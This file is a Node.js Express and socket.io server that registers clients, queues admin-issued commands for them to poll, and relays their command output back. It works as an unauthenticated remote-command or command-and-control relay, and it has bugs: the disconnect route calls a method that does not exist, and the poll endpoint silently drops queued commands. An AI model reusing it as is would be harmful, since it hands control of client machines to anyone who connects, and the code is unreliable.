const express = require("express");
const http = require("http");
const { Server } = require("socket.io");
const bodyParser = require("body-parser");

const app = express();
const server = http.createServer(app);
const io = new Server(server);

let clients = {}; // Store connected clients
let pendingCommands = {}; // To store commands for each client

// Serve static files (admin.html, etc.)
app.use(express.static("public"));
app.use(bodyParser.json());

// Admin API to disconnect clients
app.post("/admin/disconnect", (req, res) => {
  const { clientId } = req.body;
  if (clients[clientId]) {
    clients[clientId].disconnect();
    delete clients[clientId];
    res.status(200).send({ message: "Client disconnected" });
  } else {
    res.status(404).send({ message: "Client not found" });
  }
}); // Endpoint to register clients
app.post("/register", (req, res) => {
  const { id } = req.body;
  if (!id) {
    return res.status(400).json({ error: "Client ID is required" });
  }
  if (!clients[id]) {
    clients[id] = { socket: null };
    pendingCommands[id] = [];
  }
  res.json({ message: "Client registered", clientId: id });
});

// Endpoint to get pending commands for a client
app.get("/commands", (req, res) => {
  const clientId = req.query.clientId;
  if (!clientId || !clients[clientId]) {
    return res.status(404).json({ error: "Client not registered" });
  }
  const commands = pendingCommands[clientId];
  pendingCommands[clientId] = []; // Clear pending commands after sending
  res.json(commands.length > 0 ? commands[0] : null); // Send only one command at a time
});

// Endpoint to receive command output from clients
app.post("/commandOutput", (req, res) => {
  const { clientId, output } = req.body;

  if (!clientId || !clients[clientId]) {
    return res.status(404).json({ error: "Client not registered" });
  }

  console.log(`Command output from ${clientId}:`, output);

  // Notify the admin about the result
  io.emit("commandOutput", { clientId, output });
  res.json({ message: "Output received" });
});

// Handle socket.io connections for the admin
io.on("connection", (socket) => {
  console.log("Admin connected");

  // Broadcast connected clients to the admin
  socket.emit("clients", Object.keys(clients));

  // Listen for admin commands
  socket.on("command", (data) => {
    console.log("command received for client", socket.id);
    const { clientId, command } = data;

    if (clients[clientId]) {
      pendingCommands[clientId].push({ cmd: command });
      console.log(`Command sent to client: ${clientId} - ${command}`);
    } else {
      console.log(`Invalid client ID: ${clientId}`);
    }
  });

  // Handle admin disconnect
  socket.on("disconnect", () => {
    console.log("Admin disconnected");
  });
});

server.listen(3000, () => console.log("Server listening on port 3000"));
